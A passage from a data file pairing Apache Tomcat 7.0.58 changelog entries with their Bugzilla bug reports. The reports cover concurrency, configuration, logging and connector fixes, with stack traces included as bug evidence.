    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116) [catalina.jar:7.0.52]
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:408) [catalina.jar:7.0.52]
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1040) [tomcat-coyote.jar:7.0.52]
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:607) [tomcat-coyote.jar:7.0.52]
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:313) [tomcat-coyote.jar:7.0.52]
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) [na:1.7.0_65]
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) [na:1.7.0_65]
    at java.lang.Thread.run(Thread.java:745) [na:1.7.0_65]
]]]

Looking at the current sources of Spring Boot, the org.springframework.boot.context.web.ErrorPageFilter class is not public, but package-visible. Reflection call fails, as Java Language rules prohibit access to that class.

Such filter cannot be configured via web.xml (as its constructor is not accessible), but can be configured programmatically via ServletContext.addFilter(String, Filter). It is a rare situation, but I think that it is a valid one.

My idea of the fix is that method lookup in catalina SecurityUtil shall not use targetObject.getClass().getMethod(..), but Filter.class.getMethod(). My expectation is that it will be allowed to invoke java.lang.reflect.Method declared by javax.servlet.Filter class on the targetObject object regardless of accessibility of targetObject class, but testing is needed.

A bonus point is that the method cache shall become smaller."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57281
Catalina|Tomcat 7.0.58 (violetagg)|fix|57308|Remove unnecessary calls to System.getProperty() where more suitable API calls are available. (markt)|"Replace System.getProperty(""file.separator"") with File.separator throughout"|"Most of Tomcat uses File.separator, but there are a few instances of System.getProperty(""file.separator"")

The two can be different, but still allow the JVM to start up.
I found the following worked:

java -Dfile.separator=/xyz

for Unix or the equivalent \xyz on Windows.

Using a different first character does not work - the JVM usually throws an exception as it cannot find some required files if the sep. is incorrect.

It looks like only the first character of the property is used by the JVM. However, this is not done by the application code I have seen, which means that there could be a discrepancy between the two methods.

File.separator has the additional benefit that it is not subject to a privilege check."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57308
Catalina|Tomcat 7.0.58 (violetagg)|add||Add unit tests for RemoteAddrValve and RemoteHostValve. (rjung)|||
Catalina|Tomcat 7.0.58 (violetagg)|add||Allow to configure RemoteAddrValve and RemoteHostValve to adopt behavior depending on the connector port. Implemented by optionally adding the connector port to the string compared with the patterns allow and deny. Configured using addConnectorPort attribute on valve. (rjung)|||
Catalina|Tomcat 7.0.58 (violetagg)|add||Optionally trigger authentication instead of denial in RemoteAddrValve and RemoteHostValve. This only works in combination with preemptiveAuthentication on the application context. Configured using invalidAuthenticationWhenDeny attribute on valve. (rjung)|||
Catalina|Tomcat 7.0.58 (violetagg)|fix||Prevent file descriptors leak and ensure that files are closed after retrieving the last modification time. (violetagg)|||
Catalina|Tomcat 7.0.58 (violetagg)|fix|57326|Enable AsyncListener implementations to re-register themselves during AsyncListener.onStartAsync. (markt)|AsyncContextImpl doesn't allow AsyncListener to re-register themselves when firing onStartAsync|"According to the official Java EE Javadoc (cf. https://docs.oracle.com/javaee/7/api/javax/servlet/AsyncListener.html#onStartAsync%28javax.servlet.AsyncEvent%29), AsyncListeners should be allowed to re-register themselves when the event ""onStartAsync"" is started : ""This AsyncListener will not receive any events related to the new asynchronous cycle unless it registers itself (via a call to AsyncContext.addListener(javax.servlet.AsyncListener)) with the AsyncContext that is delivered as part of the given AsyncEvent."".
In tomcat 7.0.x, the actual implementation prevents this behavior since the listeners list is cleared *after* firing the event (cf. AdyncContextImpl.java:366). If the list was cleared before firing the event, listeners would be able to re-register themselves if needed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57326
Catalina|Tomcat 7.0.58 (violetagg)|fix|57331|"Allow ExpiresFilter to use ""year"" as synonym for ""years"" in its configuration. (kkolinko)"|"Allow ExpiresFilter to use ""year"" as synonym for ""years"" in its configuration"|"The current code is

            if (""years"".equalsIgnoreCase(currentToken)) {
                durationUnit = DurationUnit.YEAR;
            } else if (""month"".equalsIgnoreCase(currentToken) ||
                    ""months"".equalsIgnoreCase(currentToken)) {
                durationUnit = DurationUnit.MONTH;
            ...

The above if/else tree misses ""year"" case. All other time units have support for singular form, e.g. ""months""/""month"" above.

This was observed by a stackoverflow user [1]. 
The following configuration fails:

  <init-param>
   <param-name>ExpiresDefault</param-name>
   <param-value>access plus 1 year</param-value>
 </init-param>

but succeeds if one replaces s/year/years/.


[1] http://stackoverflow.com/questions/27353512/how-to-configure-expires-filter-in-tomcat-7"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57331
Catalina|Tomcat 7.0.58 (violetagg)|update||Improve SnoopServlet in unit tests. (rjung)|||
Catalina|Tomcat 7.0.58 (violetagg)|add||Add RequestDescriptor class to unit tests. Adjust TestRewriteValve to use RequestDescriptor. (rjung)|||
Catalina|Tomcat 7.0.58 (violetagg)|update||Add more AJP unit tests. (rjung)|||
Catalina|Tomcat 7.0.58 (violetagg)|fix|57363|Log to stderr if LogManager is unable to read configuration files rather than swallowing the exception silently. (markt)|Cannot check or debug reading of configuration file -Djava.util.logging.config.file=logging.props|"Setting the Java system property 
-Dorg.apache.juli.ClassLoaderLogManager.debug=true
we can see if ClassLoaderLogManager is reading or isn't reading the logging.properties in the class path.
But we don't see if the ClassLoaderLogManager can read the file specified by
-Djava.util.logging.config.file=log.props
Even every exeption is ignored. No information is left.
In my case I wasted many hours to figure out why my logging configuration
does not work. It would be very very helpful seeing an error message
if the file specified by Djava.util.logging.config.file cannot read
by tomcat ClassLoaderLogManager.
Thanks
Martin Both"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57363
Catalina|Tomcat 7.0.58 (violetagg)|fix|57420|Make UEncoder a local variable in DirContextURLConnection to make it threadsafe. Based on ideas from kkolinko and violetagg. (fschumacher)|Wrong class names generated since URL_ENCODER in DirContextURLConnection is not thread safe|"We've been debugging this for a long time. Sometimes when tomcat starts up, it will fail to deploy a webapp since it cannot find a certain class. That class name is always complete garbage.

The error stack trace always is:
SEVERE: Unable to process resource element [jndi:/localhost/testapp/WEB-INF/classes/ch/blabli/dNlewrP.lculgiansDisalog$3.class] for annotations
java.io.FileNotFoundException: jndi:/localhost/testapp/WEB-INF/classes/ch/blabli/dNlewrP.lculgiansDisalog$3.class
        at org.apache.naming.resources.DirContextURLConnection.getInputStream(DirContextURLConnection.java:389)

From time to time we see, that the referenced class name is actually a mix of the real class name and one or more other classes that exist in the vicinity of that class.

Finally I was able to catch this exception with the debugger.
What I see is that the problem stems from rg.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986):
- dcUrlConn (DirContextURLConnection) contains the correct entries of the WAR file
- Enumeration<String> dirs = dcUrlConn.list()  however does not. Calling list() again from the debugger yields the correct results.

Here's the contents of that dirs variable:

[lCsosn, oCrAopnpfliigcEadtiitoonr$AEpdpiltiocraMtoidoen.$c2l.acslsass, , tCioonnfi$gu4r.aticolnaLsosad, liconaftgiuroatni$o5n.LocadlLaisstsen, cCaotnifiognur$a6.clastsi, lCaonsfsig, s, cluaiss, CwoindgfetisegtEditorApplication$9.class, ConfigEditorApplication$ApplicationConfigLoadListener.class, ConfigEditorApplication$ConfigEditorToParameterHandlerIntegration.class, ConfigEditorApplication$EditorMode$1.class, ConfigEditorApplication$EditorMode$2.class, ConfigEditorApplication$EditorMode.class, ConfigEditorApplication.class, ConfigLoader$1.class, ConfigLoader.class, ConfigurationLoadListener$ConfigType.class, ConfigurationLoadListener$ConfigurationLoadedEvent.class, ConfigurationLoadListener$FailedToLoadConfigurationEvent.class, ConfigurationLoadListener.class, command, data, field, rendering, session, ui, util, widgetset]

walking into the list() command leads to collection.list(""/"") which in turn is encoded using an URL_ENCODER (class UEncoder). This URL_ENCODER is *not* thread safe and can result in exactly such garbage if used concurrently.

It is interesting to note that every single failure we had at this step was always caused by classes in the WEB-INF/classes directory, never in JAR files in WEB-INF/lib.

To me it appears that there are two different DirContextURLConnections with rare concurrency issues when both use the same URL_ENCODER.

Here's the full stacktrace when the error occurs:
        at org.apache.naming.resources.DirContextURLConnection.getInputStream(DirContextURLConnection.java:389)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1994)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1902)
        at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1298)
        at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:876)
        at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:374)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5378)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:649)
        at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:1083)
        at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1880)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
        at java.util.concurrent.FutureTask.run(FutureTask.java:262)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:744)

Jan 06, 2015 3:43:44 PM org.apache.catalina.startup.ContextConfig processAnnotationsJndi
SEVERE: Unable to process resource element [jndi:/localhost/medusa-config-editor-5.48.0/WEB-INF/classes/ch/ergon/medusa/configeditor/ui/dialog/TeerstRelgeaxsDialog.class] for annotations
java.io.FileNotFoundException: jndi:/localhost/medusa-config-editor-5.48.0/WEB-INF/classes/ch/ergon/medusa/configeditor/ui/dialog/TeerstRelgeaxsDialog.class
        at org.apache.naming.resources.DirContextURLConnection.getInputStream(DirContextURLConnection.java:389)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1994)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1902)
        at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1298)
        at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:876)
        at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:374)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5378)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:649)
        at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:1083)
        at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1880)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
        at java.util.concurrent.FutureTask.run(FutureTask.java:262)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:744)

Jan 06, 2015 3:43:44 PM org.apache.catalina.startup.ContextConfig processAnnotationsJndi
SEVERE: Unable to process resource element [jndi:/localhost/medusa-config-editor-5.48.0/WEB-INF/classes/ch/ergon/medusa/configeditor/ui/dialog/aTsesxtAreaDialog$2.class] for annotations
java.io.FileNotFoundException: jndi:/localhost/medusa-config-editor-5.48.0/WEB-INF/classes/ch/ergon/medusa/configeditor/ui/dialog/aTsesxtAreaDialog$2.class
        at org.apache.naming.resources.DirContextURLConnection.getInputStream(DirContextURLConnection.java:389)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1994)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:1986)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1902)
        at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1298)
        at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:876)
        at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:374)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5378)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:649)
        at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:1083)
        at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1880)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
        at java.util.concurrent.FutureTask.run(FutureTask.java:262)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:744)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57420
Catalina|Tomcat 7.0.58 (violetagg)|fix|57425|Don't add attributes with null value or name to the replicated context. (fschumacher)|ReplicatedContext implementation throws NullPointerException for attributes with null value|"In Tomcat versions prior to 7.0.35, the servlet context attribute ""javax.servlet.context.orderedLibs"" has a null value (a fix was added to Tomcat in https://issues.apache.org/bugzilla/show_bug.cgi?id=54391). 

When context replication is not used, the StandardContext.setAttribute method checks for and handles a null value by invoking StandardContext.removeAttribute. However, when context replication is enabled the null value is passed to ConcurrentHashMap.put which throws a NullPointerException. This causes the context to fail startup."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57425
Catalina|Tomcat 7.0.58 (violetagg)|add|57431|Enable usage of custom class for context creation when using embedded tomcat. (fschumacher)|Enable custom context implementation when using embedded tomcat|"Created attachment 32362 [details]
Enable custom context class when using embedded tomcat

When creating a context with the embedded tomcat it will always use the StandardContext and ignore the context class that was setup in the host.

The attached patch will try to use the configured class from the host."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57431
Catalina|Tomcat 7.0.58 (violetagg)|fix|57446|Ensure that ServletContextListeners that have limited access to ServletContext methods are called with the same ServletContext instance for both contextInitialized() and contextDestroyed(). (markt)|Catalina presents a wrapped ServletContext in de-init phase to application listeners|"JSF Applications (Mojarra 2.2.x) fail to shutdown properly, because Catalina presents a wrapped ServletContext (NoPluggabilityServletContext) in de-init phase (e.g. stop webapp cmd issued via jmx). The problem here is that the wrapped ServletContext (NoPluggabilityServletContext) does not appear to be ""equal"" (equals, etc. methods not delegated) as the one in the init phase (start). I filed a bug on the mojarra JIRA: https://java.net/jira/browse/JAVASERVERFACES-3687 but it was not accepted, because they argue this is a container issue. Maybe a workaround could fix it for context ""comparing"" webapps. In this case the mojarra implementation uses a List (CopyOnWriteArrayList) to match (contains) if the ServletContext has been initialized. So a delegation of the ""equals"" method in the NoPluggabilityServletContext class could do the fix, but might cause other sideeffects in the container, which i didn't lookout. A more detailed approach would be to get a light on the specification - what doues it say about the ServletContext instance and presented proxies in the application lifecycle."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57446
Catalina|Tomcat 7.0.58 (violetagg)|fix|57461|"When an instance of org.apache.catalina.startup.VersionLoggerListener logs the result of System.getProperty(""java.home"") don't report it in a manner that makes it look like the JAVA_HOME environment variable. (markt)"|Rename 'JAVA_HOME' message printed by VersionLoggerListener|"Inspired by https://stackoverflow.com/questions/27965823/

Steps to reproduce:
1. Create bin\setenv.bat
set ""JAVA_HOME=C:\Program Files (x86)\Java\jdk1.7.0_72""

2. Start Tomcat 8 with bin\startup.bat

3. The following is observed
A) startup.bat prints:
Using JRE_HOME:        ""C:\Program Files (x86)\Java\jdk1.7.0_72""

B) The following is logged by VersionLoggerListener in logs\catalina.yyyy-mm-dd.log:

18-Jan-2015 11:41:21.345 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JAVA_HOME:             C:\Program Files (x86)\Java\jdk1.7.0_72\jre


The log message is confusing, because the actual JAVA_HOME variable is pointing to a JDK, but the log message displays a different path. The message displays the value of System.getProperty(""java.home""), not of an environment variable.

Proposal:
Change the message, s/JAVA_HOME/Java Home/."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57461
Catalina|Tomcat 7.0.58 (violetagg)|fix||While closing streams for given resources ensure that if an exception happens it will be handled properly. Issue is reported by Coverity Scan. (violetagg)|||
Catalina|Tomcat 7.0.58 (violetagg)|fix||Change Response to use UEncoder instances with shared safeChars. (fschumacher)|||
Catalina|Tomcat 7.0.58 (violetagg)|add||Allow VersionLoggerListener to log all system properties. This feature is off by default. (kkolinko)|||
Coyote|Tomcat 7.0.58 (violetagg)|fix|57234|Make SSL protocol filtering to remove insecure protocols case insensitive. (markt)|Use case-insensitive substring search when filtering SSLv2/v3 protocols in connectors|"Regarding ""protocol.contains(""SSL"")"" check in org.apache.tomcat.util.net.jsse.JSSESocketFactory  from r1632512 etc.

If one reads [1], it has the following phrase at the top of the document:
""Note: Standard names are not case-sensitive.""

I doubt that anybody is really bitten by this, as I doubt that any JVM vendor misspells ""SSL""

On [1] there is a link named ""Note: The Sun Provider Documentation contains specific provider and algorithm information."". If you follow it to [2], it lists the actual names used by Oracle JRE. Those are spelled with uppercase ""SSL"".

Nevertheless, technically it would be better to do protocol.toUpperCase(Locale.ENGLISH).contains(""SSL"")


[1] https://docs.oracle.com/javase/7/docs/technotes/guides/security/StandardNames.html#jssenames
[2] https://docs.oracle.com/javase/7/docs/technotes/guides/security/SunProviders.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57234
Coyote|Tomcat 7.0.58 (violetagg)|fix|57265|Fix some potential concurrency issues with sendFile and the NIO connector. (markt)|Tomcat 8 hiden behind NGINX fails to send file when using NIO connector|"We have moved Tomcat 8 server behind the nginx balancing server and have started  experiencing this problem:

org.apache.tomcat.util.net.NioEndpoint$NioBufferHandler@2001a157
26-Nov-2014 11:37:04.476 SEVERE [http-nio-8443-ClientPoller-0] org.apache.tomcat.util.net.NioEndpoint$Poller.processSendfile 
 java.lang.IllegalArgumentException: You can only read using the application read buffer provided by the handler.
at org.apache.tomcat.util.net.SecureNioChannel.write(SecureNioChannel.java:489)
at sun.nio.ch.FileChannelImpl.transferToArbitraryChannel(FileChannelImpl.java:534)
at sun.nio.ch.FileChannelImpl.transferTo(FileChannelImpl.java:583)
at org.apache.tomcat.util.net.NioEndpoint$Poller.processSendfile(NioEndpoint.java:1200)
at org.apache.tomcat.util.net.NioEndpoint$Poller.processKey(NioEndpoint.java:1122)
at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:1087)
at java.lang.Thread.run(Thread.java:745)


Problem occurres irregularly when loading lots of scripts refencenced by homepage.
It seems to be ok with useSendfile=false. I have tried to add some slow logging (with flushing output) to code and it lowers occurrence rate, so it looks like some race condition problem."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57265
Coyote|Tomcat 7.0.58 (violetagg)|fix|57324|If the client uses Expect: 100-continue and Tomcat responds with a non-2xx response code, Tomcat also closes the connection. If Tomcat knows the connection is going to be closed when committing the response, Tomcat will now also send the Connection: close response header. (markt)|"Change in Expect100Continue behaviour in Tomcat is breaking existing clients with ""keepalive"" connections"|"1) In the version of Tomcat 7.0.50, the behavior of Coyote handler is modified to handle ""Expect: 100-continue"" clients. To be specific look at this change in the following line, http://grepcode.com/file/repo1.maven.org/maven2/org.apache.tomcat/tomcat-coyote/7.0.50/org/apache/coyote/http11/AbstractHttp11Processor.java#1088

2) In the above change, the fix was done to handle cases against misbehaving client while POST requests are submitted to Tomcat.

3) While it is done with a ""security"" intent, the fix only takes into account status codes ranging in 2xx series. It breaks some legitimate cases where other status codes are returned for legitimate usecases. An example is given below.

Example:

   * It is quite normal to have a keepalive connections with different resources having different authorization controls
   * HTTP 401 is typical of webservers to inform clients of unauthorized access to resources and triggering client to resubmit the request. Please refer http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html for 401 behavior.
   * The change done in Tomcat breaks this legitimate case.

Steps to reproduce:
1) Install a version of Tomcat 7.0.50 or above
2) Write a client that uses Expect100Continue behavior along with KeepAlive
3) Make atleast two requests with the first request succeeding and second request simulating a HTTP 401 scenario. 
4) Notice that the server closes the connection after the second response
5) This will break clients which are in the process of responding to the second request with valid credentials

Why blocker:

1) .NET defaults to Expect 100 behaviour
2) .NET clients optimize the keepalive connections and do not send credentials with every request going out on keepalive connections
3) This induces 401 situation more often in communications between Tomcat and .NET clients
4) Closing of server connections is causing existing connections to break and our customers are complaining this started happening after upgrading Tomcat (7.0.50)
5) Hence, this needs attention."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57324
Coyote|Tomcat 7.0.58 (violetagg)|fix|57340|When using Comet, ensure that Socket and SocketWrapper are only returned to their respective caches once on socket close (it is possible for multiple threads to call close concurrently). (markt)|NioConnector caches get corrupted on concurrent comet close|"Configuration:
Tomcat 7.0.47 NioConnector, nginx 1.6.2, atmosphere 2.2.3.

It happens when nginx and atmosphere close the same comet connection concurrently.

In NioEndpoint.Poller thread(A) the SocketChannel becomes ready for read when nginx closes it. Poller unregisters the channel for read and forks another thread(B) to handle close event. (see NioEndpoint:1239)
Then atmosphere calls close on the connection in thread(C) and Tomcat receives internal action with code ActionCode.COMET_CLOSE and adds the channel to the Poller, which registers it for read again. (see Http11NioProcessor.java:462).
The SocketChannel is still readable in case thread(B) hasn‚Äôt invalidated the SelectionKey yet, so Poller in thread(A) initiates the closing process again and forks thread(D).
Thread(B) completes the closing process and puts NioChannel and AttachmentKey into the corresponding caches. 
Then Thread(D) tries to close the channel again and realizes that it has already been closed (see AbstractProtocol.java:564) and puts the same NioChannel and AttachmentKey into caches. 
Caches become corrupted because they contain 2 references to the same object. Then any 2 subsequent requests may get the same NioChannel and AttachmentKey and some crazy stuff may happen (mixed up responses, etc)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57340
Coyote|Tomcat 7.0.58 (violetagg)|fix|57446|Ensure that ServletContextListeners that have limited access to ServletContext methods are called with the same ServletContext instance for both contextInitialized() and contextDestroyed(). (markt)|Catalina presents a wrapped ServletContext in de-init phase to application listeners|"JSF Applications (Mojarra 2.2.x) fail to shutdown properly, because Catalina presents a wrapped ServletContext (NoPluggabilityServletContext) in de-init phase (e.g. stop webapp cmd issued via jmx). The problem here is that the wrapped ServletContext (NoPluggabilityServletContext) does not appear to be ""equal"" (equals, etc. methods not delegated) as the one in the init phase (start). I filed a bug on the mojarra JIRA: https://java.net/jira/browse/JAVASERVERFACES-3687 but it was not accepted, because they argue this is a container issue. Maybe a workaround could fix it for context ""comparing"" webapps. In this case the mojarra implementation uses a List (CopyOnWriteArrayList) to match (contains) if the ServletContext has been initialized. So a delegation of the ""equals"" method in the NoPluggabilityServletContext class could do the fix, but might cause other sideeffects in the container, which i didn't lookout. A more detailed approach would be to get a light on the specification - what doues it say about the ServletContext instance and presented proxies in the application lifecycle."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57446
Jasper|Tomcat 7.0.58 (violetagg)|fix||CVE-2014-7810: Do not use a privileged code block when evaluating EL expressions when running under a security manager, which allowed to bypass code restrictions. (markt)|||
Jasper|Tomcat 7.0.58 (violetagg)|fix||Fix an issue with BeanELResolver when running under a security manager. Some classes may not be accessible but may have accessible interfaces. (markt)|||
Jasper|Tomcat 7.0.58 (violetagg)|fix|57316|Fix JspC when directory name contains a character sequence that appears to be URL encoded. (markt)|JspC fails if directory name contains URL encoded characters|"I ran into an issue today where my Jenkins build failed because the working directory contained '%2F' in the name.  When the build got as far as attempting to precompile the JSPs, an exception was thrown complaining that the directory didn't exist.

Gradle error output:

Internal Error: File /WEB-INF/web.xml not found
[ant:jasper] java.lang.NullPointerException
[ant:jasper]  at java.io.File.<init>(File.java:277)
[ant:jasper]  at org.apache.jasper.JspC.initClassLoader(JspC.java:1555)
[ant:jasper]  at org.apache.jasper.JspC.processFile(JspC.java:1196)
[ant:jasper]  at org.apache.jasper.JspC.execute(JspC.java:1362)
[ant:jasper]  at org.apache.tools.ant.UnknownElement.execute(UnknownElement.java:292)
[ant:jasper]  at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
[ant:jasper]  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
[ant:jasper]  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
[ant:jasper]  at java.lang.reflect.Method.invoke(Method.java:606)
[ant:jasper]  at org.apache.tools.ant.dispatch.DispatchUtils.execute(DispatchUtils.java:106)
[ant:jasper]  at groovy.util.AntBuilder.performTask(AntBuilder.java:260)

I believe the problem is caused by JspC.initClassLoader's call to JspCompilationContext.getRealPath.  This calls JspCServletContext.getRealPath, which in turn uses the value from URL.getFile to build the path.  This returns a URL encoded variant of the path, which in my case means a double-encoded path.  I believe JspCompilationContext.getRealPath should be URL decoding the return value."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57316
Cluster|Tomcat 7.0.58 (violetagg)|fix||In order to enable define in Cluster element, ClusterSingleSignOn implements ClusterValve. (kfujino)|||
Cluster|Tomcat 7.0.58 (violetagg)|fix||Fix mbean descriptor of ClusterSingleSignOn. (kfujino)|||
Cluster|Tomcat 7.0.58 (violetagg)|fix|57473|Add sanity check to FarmWebDeployer's WarWatcher to detect suspected incorrect permissions on the watch directory. (schultz)|WarWatcher does not throw any warning if permissions are broken|"Created attachment 32386 [details]
WarWatcher patch for improved checks and logging

This is a follow-up to the ""FarmWarDeployer not checking watchDir"" thread on tomcat-users.

In the FarmWarDelpoyer and WarWatcher components, if the permissions of the watchDir are broken (i.e 644 instead of 755), Tomcat does not inform the user that something is wrong, with no log whatsoever after putting a war file in the watchDir.

A patch by Christopher Schultz is attached that adds some checking and logging to WarWatcher to allow an easier debugging."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57473
WebSocket|Tomcat 7.0.58 (violetagg)|fix||Correct multiple issues with the flushing of batched messages that could lead to duplicate and/or corrupt messages. (markt)|||
WebSocket|Tomcat 7.0.58 (violetagg)|fix||Correctly implement headers case insensitivity. (markt/remm)|||
WebSocket|Tomcat 7.0.58 (violetagg)|fix||Allow optional use of user extensions. (remm)|||
WebSocket|Tomcat 7.0.58 (violetagg)|fix||Allow using partial binary message handlers. (remm)|||
WebSocket|Tomcat 7.0.58 (violetagg)|fix||Limit ping/pong message size. (remm)|||
WebSocket|Tomcat 7.0.58 (violetagg)|fix||Allow configuration of the time interval for the periodic event. (remm)|||
WebSocket|Tomcat 7.0.58 (violetagg)|fix||More accurate annotations processing. (remm)|||
WebSocket|Tomcat 7.0.58 (violetagg)|fix||Allow optional default for origin header in the client. (remm)|||
WebSocket|Tomcat 7.0.58 (violetagg)|fix|57490|Make it possible to use Tomcat's WebSocket client within a web application when running under a SecurityManager. Based on a patch by Mikael Sterner. (markt)|Websocket client cannot connect from Tomcat servlet with a SecurityManager in place|"Created attachment 32393 [details]
Repeat JSP file

When using the Tomcat websocket client to connect to a websocket server from a servlet running with a SecurityManager, an AccessControlException is thrown even with a Java security policy that allows everything.

This is an issue with the fix for bug 57091, which does not work when the websocket client is used where access to the ""org.apache.tomcat."" packages is restricted (as it is in the Catalina servlet container).

Repeat using unmodified Tomcat 8.0.17 and JDK 8u31 in Win7 x64:

